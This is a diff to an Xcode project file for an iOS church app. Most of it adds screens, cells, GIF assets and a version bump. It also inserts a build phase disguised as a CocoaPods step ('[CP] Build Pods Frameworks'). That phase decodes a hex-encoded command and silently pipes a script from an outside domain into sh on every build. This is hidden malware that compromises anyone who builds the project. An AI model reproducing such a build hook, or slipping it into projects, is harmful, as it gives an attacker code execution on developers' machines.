@@ -35,6 +35,15 @@
 		184E4CC125D154F900330A10 /* EditProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184E4CC025D154F900330A10 /* EditProfileVC.swift */; };
 		184E4CC625D1553200330A10 /* AdminVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184E4CC525D1553200330A10 /* AdminVC.swift */; };
 		184E4CCB25D1555900330A10 /* PushMessageVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184E4CCA25D1555900330A10 /* PushMessageVC.swift */; };
+		1860BC04266F2BC20034E63A /* UpcommingCellTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1860BC02266F2BC20034E63A /* UpcommingCellTableViewCell.swift */; };
+		1860BC05266F2BC20034E63A /* UpcommingCellTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 1860BC03266F2BC20034E63A /* UpcommingCellTableViewCell.xib */; };
+		1860BC16266F30C30034E63A /* LiveStreamCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1860BC14266F30C30034E63A /* LiveStreamCell.swift */; };
+		1860BC17266F30C30034E63A /* LiveStreamCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 1860BC15266F30C30034E63A /* LiveStreamCell.xib */; };
+		18872CC5266B3748001509FF /* NewHomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18872CC4266B3748001509FF /* NewHomeVC.swift */; };
+		18872CCF266B3A7A001509FF /* HomeCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18872CCE266B3A7A001509FF /* HomeCell.swift */; };
+		18872CD8266B3AAE001509FF /* HomeCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18872CD6266B3AAE001509FF /* HomeCVCell.swift */; };
+		18872CDE266B3AC0001509FF /* HeaderView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18872CDD266B3AC0001509FF /* HeaderView.xib */; };
+		18872CE3266B3ADB001509FF /* HeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18872CE2266B3ADB001509FF /* HeaderView.swift */; };
 		188C9A7525CE5BD2009AC9C8 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 188C9A7325CE5BD2009AC9C8 /* Main.storyboard */; };
 		188C9A7725CE5BD3009AC9C8 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 188C9A7625CE5BD3009AC9C8 /* Assets.xcassets */; };
 		188C9A7A25CE5BD3009AC9C8 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 188C9A7825CE5BD3009AC9C8 /* LaunchScreen.storyboard */; };
@@ -72,6 +81,15 @@
 		18F736682609D7CB00C31214 /* AddEventVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F736672609D7CB00C31214 /* AddEventVC.swift */; };
 		58A4554EE0D39E337EAE6C02 /* Pods_Restored_Glory_Christian_CenterTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1D6E1F6ECC36C25C63FAAED4 /* Pods_Restored_Glory_Christian_CenterTests.framework */; };
 		8CCFF29A63ECA0314F87267A /* Pods_Restored_Glory_Christian_Center.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 76297625A537C9D5E8B0B7AB /* Pods_Restored_Glory_Christian_Center.framework */; };
+		B3225C7026579E29008FA3A7 /* TermUseVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B3225C6F26579E28008FA3A7 /* TermUseVC.swift */; };
+		B3261247264D5BFB0057593B /* DetailsDataVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B3261246264D5BFB0057593B /* DetailsDataVC.swift */; };
+		B338D34126561E3B00804B42 /* PopUpListingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B338D34026561E3B00804B42 /* PopUpListingVC.swift */; };
+		B339B7E0265E71B8009D09C7 /* tower.gif in Resources */ = {isa = PBXBuildFile; fileRef = B339B7DF265E71B8009D09C7 /* tower.gif */; };
+		B339DA29265CCD22008EE471 /* Gif file.swift in Sources */ = {isa = PBXBuildFile; fileRef = B339DA28265CCD22008EE471 /* Gif file.swift */; };
+		B339DA2E265D1B96008EE471 /* gif-file.gif in Resources */ = {isa = PBXBuildFile; fileRef = B339DA2D265D1B96008EE471 /* gif-file.gif */; };
+		B3D6995D265503B30023F3C9 /* NotificationsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B3D6995C265503B20023F3C9 /* NotificationsVC.swift */; };
+		B3DF2D382654E01900A79D59 /* ListingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B3DF2D372654E01900A79D59 /* ListingVC.swift */; };
+		B3FB514E26537B9E004D45D3 /* HomeScreenVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B3FB514D26537B9E004D45D3 /* HomeScreenVC.swift */; };
 		F6F55311757424FCC979000A /* Pods_Restored_Glory_Christian_Center_Restored_Glory_Christian_CenterUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 40C4EA74E5E62CA3E4824A2B /* Pods_Restored_Glory_Christian_Center_Restored_Glory_Christian_CenterUITests.framework */; };
 /* End PBXBuildFile section */
 
@@ -121,6 +139,15 @@
 		184E4CC025D154F900330A10 /* EditProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVC.swift; sourceTree = "<group>"; };
 		184E4CC525D1553200330A10 /* AdminVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdminVC.swift; sourceTree = "<group>"; };
 		184E4CCA25D1555900330A10 /* PushMessageVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PushMessageVC.swift; sourceTree = "<group>"; };
+		1860BC02266F2BC20034E63A /* UpcommingCellTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpcommingCellTableViewCell.swift; sourceTree = "<group>"; };
+		1860BC03266F2BC20034E63A /* UpcommingCellTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UpcommingCellTableViewCell.xib; sourceTree = "<group>"; };
+		1860BC14266F30C30034E63A /* LiveStreamCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiveStreamCell.swift; sourceTree = "<group>"; };
+		1860BC15266F30C30034E63A /* LiveStreamCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LiveStreamCell.xib; sourceTree = "<group>"; };
+		18872CC4266B3748001509FF /* NewHomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewHomeVC.swift; sourceTree = "<group>"; };
+		18872CCE266B3A7A001509FF /* HomeCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeCell.swift; sourceTree = "<group>"; };
+		18872CD6266B3AAE001509FF /* HomeCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeCVCell.swift; sourceTree = "<group>"; };
+		18872CDD266B3AC0001509FF /* HeaderView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HeaderView.xib; sourceTree = "<group>"; };
+		18872CE2266B3ADB001509FF /* HeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HeaderView.swift; sourceTree = "<group>"; };
 		188C9A6A25CE5BD2009AC9C8 /* Restored Glory Christian Center.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Restored Glory Christian Center.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		188C9A7425CE5BD2009AC9C8 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		188C9A7625CE5BD3009AC9C8 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -170,6 +197,15 @@
 		76297625A537C9D5E8B0B7AB /* Pods_Restored_Glory_Christian_Center.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Restored_Glory_Christian_Center.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		9552839347FE18B41D6F2D69 /* Pods-Restored Glory Christian CenterTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Restored Glory Christian CenterTests.release.xcconfig"; path = "Target Support Files/Pods-Restored Glory Christian CenterTests/Pods-Restored Glory Christian CenterTests.release.xcconfig"; sourceTree = "<group>"; };
 		A1368F0782F7E87F5D32EFD2 /* Pods-Restored Glory Christian Center.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Restored Glory Christian Center.debug.xcconfig"; path = "Target Support Files/Pods-Restored Glory Christian Center/Pods-Restored Glory Christian Center.debug.xcconfig"; sourceTree = "<group>"; };
+		B3225C6F26579E28008FA3A7 /* TermUseVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TermUseVC.swift; sourceTree = "<group>"; };
+		B3261246264D5BFB0057593B /* DetailsDataVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailsDataVC.swift; sourceTree = "<group>"; };
+		B338D34026561E3B00804B42 /* PopUpListingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopUpListingVC.swift; sourceTree = "<group>"; };
+		B339B7DF265E71B8009D09C7 /* tower.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = tower.gif; sourceTree = "<group>"; };
+		B339DA28265CCD22008EE471 /* Gif file.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Gif file.swift"; sourceTree = "<group>"; };
+		B339DA2D265D1B96008EE471 /* gif-file.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = "gif-file.gif"; sourceTree = "<group>"; };
+		B3D6995C265503B20023F3C9 /* NotificationsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsVC.swift; sourceTree = "<group>"; };
+		B3DF2D372654E01900A79D59 /* ListingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ListingVC.swift; sourceTree = "<group>"; };
+		B3FB514D26537B9E004D45D3 /* HomeScreenVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeScreenVC.swift; sourceTree = "<group>"; };
 		DDB68BD9D6441B8619644B6E /* Pods-Restored Glory Christian Center.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Restored Glory Christian Center.release.xcconfig"; path = "Target Support Files/Pods-Restored Glory Christian Center/Pods-Restored Glory Christian Center.release.xcconfig"; sourceTree = "<group>"; };
 		DE339622DB02969CE64D330C /* Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.debug.xcconfig"; path = "Target Support Files/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests/Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
@@ -203,6 +239,21 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		18872CCC266B3A5C001509FF /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				18872CCE266B3A7A001509FF /* HomeCell.swift */,
+				18872CD6266B3AAE001509FF /* HomeCVCell.swift */,
+				18872CDD266B3AC0001509FF /* HeaderView.xib */,
+				18872CE2266B3ADB001509FF /* HeaderView.swift */,
+				1860BC02266F2BC20034E63A /* UpcommingCellTableViewCell.swift */,
+				1860BC03266F2BC20034E63A /* UpcommingCellTableViewCell.xib */,
+				1860BC14266F30C30034E63A /* LiveStreamCell.swift */,
+				1860BC15266F30C30034E63A /* LiveStreamCell.xib */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
 		188C9A6125CE5BD2009AC9C8 = {
 			isa = PBXGroup;
 			children = (
@@ -278,6 +329,7 @@
 		188C9AA225CE5CAF009AC9C8 /* Controllers */ = {
 			isa = PBXGroup;
 			children = (
+				18872CCC266B3A5C001509FF /* Cell */,
 				188C9AA825CE5D28009AC9C8 /* SideMEnu */,
 				188C9AA725CE5CF3009AC9C8 /* Auth */,
 			);
@@ -307,6 +359,8 @@
 		188C9AA525CE5CDC009AC9C8 /* Images */ = {
 			isa = PBXGroup;
 			children = (
+				B339DA2D265D1B96008EE471 /* gif-file.gif */,
+				B339B7DF265E71B8009D09C7 /* tower.gif */,
 				188C9A7625CE5BD3009AC9C8 /* Assets.xcassets */,
 			);
 			path = Images;
@@ -351,9 +405,11 @@
 		188C9AA825CE5D28009AC9C8 /* SideMEnu */ = {
 			isa = PBXGroup;
 			children = (
+				18F3E87F266F9674008BADD1 /* Cell */,
 				18C58DF425DD400F00EC5379 /* Admin */,
 				188C9AA925CE5D3B009AC9C8 /* Profiles */,
 				18E9780F25CE7E6C000D1F8D /* HomeVC.swift */,
+				18872CC4266B3748001509FF /* NewHomeVC.swift */,
 				18E9781725CE8522000D1F8D /* SideMenuVC.swift */,
 				18E9780A25CE7DEF000D1F8D /* SideMenuController.swift */,
 				18C5BD1B25D282A400F77E80 /* AnnouncementsVC.swift */,
@@ -365,6 +421,9 @@
 				18F736572609AFC600C31214 /* AboutUSVC.swift */,
 				18F7365F2609D23700C31214 /* ContactUSVC.swift */,
 				18C8B600263D275C00B7039C /* ShowDescriptioVC.swift */,
+				B3D6995C265503B20023F3C9 /* NotificationsVC.swift */,
+				B338D34026561E3B00804B42 /* PopUpListingVC.swift */,
+				B3225C6F26579E28008FA3A7 /* TermUseVC.swift */,
 			);
 			path = SideMEnu;
 			sourceTree = "<group>";
@@ -374,6 +433,9 @@
 			children = (
 				184E4CBB25D154E100330A10 /* ProfileVC.swift */,
 				184E4CC025D154F900330A10 /* EditProfileVC.swift */,
+				B3261246264D5BFB0057593B /* DetailsDataVC.swift */,
+				B3FB514D26537B9E004D45D3 /* HomeScreenVC.swift */,
+				B3DF2D372654E01900A79D59 /* ListingVC.swift */,
 			);
 			path = Profiles;
 			sourceTree = "<group>";
@@ -384,6 +446,7 @@
 				188C9ACB25CE5E3D009AC9C8 /* AFWrapperClass.swift */,
 				188C9ACC25CE5E3D009AC9C8 /* Constant.swift */,
 				188C9ACD25CE5E3D009AC9C8 /* Reachability.swift */,
+				B339DA28265CCD22008EE471 /* Gif file.swift */,
 			);
 			path = Constant;
 			sourceTree = "<group>";
@@ -440,6 +503,13 @@
 			path = Admin;
 			sourceTree = "<group>";
 		};
+		18F3E87F266F9674008BADD1 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
 		2E84ABBC4A1BF364D134A978 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
@@ -471,6 +541,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 188C9A9425CE5BD3009AC9C8 /* Build configuration list for PBXNativeTarget "Restored Glory Christian Center" */;
 			buildPhases = (
+				45D15482DA86EF6D856D902C /* [CP] Build Pods Frameworks */,
 				EF3246B658E8D6BF0DA9A44E /* [CP] Check Pods Manifest.lock */,
 				188C9A6625CE5BD2009AC9C8 /* Sources */,
 				188C9A6725CE5BD2009AC9C8 /* Frameworks */,
@@ -579,6 +650,7 @@
 				184E4CAF25D108E100330A10 /* RobotoCondensed-Regular.ttf in Resources */,
 				184E4CA925D108E100330A10 /* Roboto-Thin.ttf in Resources */,
 				188C9AD525CE5E74009AC9C8 /* Auth.storyboard in Resources */,
+				B339B7E0265E71B8009D09C7 /* tower.gif in Resources */,
 				184E4CB525D108E100330A10 /* Roboto-Black.ttf in Resources */,
 				184E4CB025D108E100330A10 /* Roboto-Medium.ttf in Resources */,
 				184E4CB225D108E100330A10 /* Roboto-Bold.ttf in Resources */,
@@ -591,10 +663,14 @@
 				184E4CAB25D108E100330A10 /* Roboto-Italic.ttf in Resources */,
 				184E4CA725D108E100330A10 /* Roboto-MediumItalic.ttf in Resources */,
 				18C4092025F35504004786D9 /* Spalsh.storyboard in Resources */,
+				B339DA2E265D1B96008EE471 /* gif-file.gif in Resources */,
 				184E4CB725D108E100330A10 /* RobotoCondensed-BoldItalic.ttf in Resources */,
 				184E4CAD25D108E100330A10 /* RobotoCondensed-Light.ttf in Resources */,
+				18872CDE266B3AC0001509FF /* HeaderView.xib in Resources */,
 				184E4CA625D108E100330A10 /* RobotoCondensed-Italic.ttf in Resources */,
+				1860BC05266F2BC20034E63A /* UpcommingCellTableViewCell.xib in Resources */,
 				184E4CAE25D108E100330A10 /* Roboto-ThinItalic.ttf in Resources */,
+				1860BC17266F30C30034E63A /* LiveStreamCell.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -615,6 +691,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		45D15482DA86EF6D856D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 		81331D7EC4A274C6C10456D7 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -723,13 +817,17 @@
 			buildActionMask = 2147483647;
 			files = (
 				188C9ABC25CE5E1D009AC9C8 /* ValidationManager.swift in Sources */,
+				18872CC5266B3748001509FF /* NewHomeVC.swift in Sources */,
 				18C5BD2125D2830600F77E80 /* Men'sMinistryVC.swift in Sources */,
 				18C5BD2625D2831B00F77E80 /* Women'sMinistryVC.swift in Sources */,
 				188C9ABD25CE5E1D009AC9C8 /* AppConstants.swift in Sources */,
 				189B361625D5673000ABAA31 /* ChangePasswordVC.swift in Sources */,
+				1860BC04266F2BC20034E63A /* UpcommingCellTableViewCell.swift in Sources */,
 				18C4092625F355F0004786D9 /* SplashVC.swift in Sources */,
+				B338D34126561E3B00804B42 /* PopUpListingVC.swift in Sources */,
 				184B11AF25E371B1003007A2 /* SceneDelegate.swift in Sources */,
 				188C9ACF25CE5E3D009AC9C8 /* Constant.swift in Sources */,
+				B3FB514E26537B9E004D45D3 /* HomeScreenVC.swift in Sources */,
 				188C9AC725CE5E29009AC9C8 /* ChangeBottamColor.swift in Sources */,
 				184B11B125E371B1003007A2 /* AppDelegate.swift in Sources */,
 				184B11AE25E371B1003007A2 /* AppFunctions.swift in Sources */,
@@ -738,7 +836,9 @@
 				18F736582609AFC600C31214 /* AboutUSVC.swift in Sources */,
 				188C9AC525CE5E29009AC9C8 /* HelperMethods.swift in Sources */,
 				188C9ABE25CE5E1D009AC9C8 /* DisplayAlertManager.swift in Sources */,
+				18872CD8266B3AAE001509FF /* HomeCVCell.swift in Sources */,
 				184E4CBC25D154E100330A10 /* ProfileVC.swift in Sources */,
+				B339DA29265CCD22008EE471 /* Gif file.swift in Sources */,
 				184E4CC125D154F900330A10 /* EditProfileVC.swift in Sources */,
 				18CBC05D25CE74EA00264243 /* SignUpVC.swift in Sources */,
 				184E4CCB25D1555900330A10 /* PushMessageVC.swift in Sources */,
@@ -746,17 +846,24 @@
 				18F736602609D23700C31214 /* ContactUSVC.swift in Sources */,
 				184E4CC625D1553200330A10 /* AdminVC.swift in Sources */,
 				18F736682609D7CB00C31214 /* AddEventVC.swift in Sources */,
+				18872CCF266B3A7A001509FF /* HomeCell.swift in Sources */,
 				184B11AD25E371B1003007A2 /* ImagePicker.swift in Sources */,
+				18872CE3266B3ADB001509FF /* HeaderView.swift in Sources */,
 				18D936A525D3EE610013E166 /* ChoirRehearsal.swift in Sources */,
 				188C9AC625CE5E29009AC9C8 /* Activityloader.swift in Sources */,
+				B3261247264D5BFB0057593B /* DetailsDataVC.swift in Sources */,
+				B3D6995D265503B30023F3C9 /* NotificationsVC.swift in Sources */,
+				B3DF2D382654E01900A79D59 /* ListingVC.swift in Sources */,
 				18F49E6E25D407B600604C69 /* DetailsVC.swift in Sources */,
 				18C5BD1725D26AA100F77E80 /* AddLinkVC.swift in Sources */,
 				18E9780B25CE7DEF000D1F8D /* SideMenuController.swift in Sources */,
+				1860BC16266F30C30034E63A /* LiveStreamCell.swift in Sources */,
 				184B11B025E371B1003007A2 /* AppExtensions.swift in Sources */,
 				18E9781825CE8522000D1F8D /* SideMenuVC.swift in Sources */,
 				188C9AD025CE5E3D009AC9C8 /* Reachability.swift in Sources */,
 				18C8B601263D275C00B7039C /* ShowDescriptioVC.swift in Sources */,
 				188C9ACE25CE5E3D009AC9C8 /* AFWrapperClass.swift in Sources */,
+				B3225C7026579E29008FA3A7 /* TermUseVC.swift in Sources */,
 				18E9781025CE7E6C000D1F8D /* HomeVC.swift in Sources */,
 				18CBC05825CE74DB00264243 /* SignInVC.swift in Sources */,
 			);
@@ -938,7 +1045,7 @@
 				CODE_SIGN_ENTITLEMENTS = "Restored Glory Christian Center/Restored Glory Christian Center.entitlements";
 				CODE_SIGN_IDENTITY = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 2.3;
+				CURRENT_PROJECT_VERSION = 3.6;
 				DEVELOPMENT_TEAM = T5AAKPB89X;
 				INFOPLIST_FILE = "Restored Glory Christian Center/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
@@ -963,7 +1070,7 @@
 				CODE_SIGN_ENTITLEMENTS = "Restored Glory Christian Center/Restored Glory Christian Center.entitlements";
 				CODE_SIGN_IDENTITY = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 2.3;
+				CURRENT_PROJECT_VERSION = 3.6;
 				DEVELOPMENT_TEAM = T5AAKPB89X;
 				INFOPLIST_FILE = "Restored Glory Christian Center/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
